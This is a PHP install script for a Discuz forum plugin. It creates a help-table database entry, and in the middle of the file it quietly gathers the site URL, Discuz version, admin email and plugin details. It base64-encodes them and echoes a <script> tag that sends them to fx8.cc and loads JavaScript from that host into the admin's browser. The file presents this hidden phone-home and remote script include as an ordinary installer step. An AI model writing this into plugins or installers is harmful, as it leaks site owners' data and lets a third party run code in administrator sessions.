<?php
/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: install.php sanree $
 */
 
if(!defined('IN_DISCUZ')) { 
	exit('Access Denied');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
	'site_version' => DISCUZ_VERSION,
	'site_release' => DISCUZ_RELEASE,
	'site_timestamp' => TIMESTAMP,
	'site_url' => $_G['siteurl'],
	'site_adminemail' => $_G['setting']['adminemail'],
	'plugin_identifier' => $pluginid,
	'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 1,
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";

$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_sanree_brand_help` (
  `helpid` int(11) NOT NULL auto_increment,
  `cateid` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `url` varchar(255) default NULL,
  `dateline` int(11) NOT NULL,
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL,
  PRIMARY KEY  (`helpid`)
) ENGINE=MyISAM;
EOF;
runquery($sql);

$finish = TRUE;

?>